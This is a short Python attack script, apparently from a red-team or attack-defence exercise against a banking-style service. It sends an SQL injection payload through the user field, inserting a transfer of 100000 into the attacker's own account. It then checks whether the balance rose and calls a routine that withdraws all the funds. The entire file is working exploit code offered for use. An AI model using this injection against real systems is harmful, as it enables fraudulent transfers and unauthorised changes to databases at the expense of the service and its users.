from loguru import logger

from red.attacks.withdraw_all import withdraw_all_for
from red.config import User, config
from red.utils import client


def inject_balance(user: User):
    payload = f"jelena'; insert into transfers (user,amount) values ({user.user}, 100000) --"
    client.process(user=payload, action=client.Action.balance)


def run():
    user = config.our_users[0]
    starting_balance = client.get_balance(user)
    for injection in [inject_balance]:
        logger.info(f"Trying injection {injection.__name__}...")
        injection(user)
        new_balance = client.get_balance(user)
        if new_balance != starting_balance:
            logger.opt(ansi=True).info(
                f"<green>Successful injection: "
                f"balance {starting_balance} -> {new_balance} "
                f"({injection.__name__})!</green>"
            )
            withdraw_all_for(user)
            return
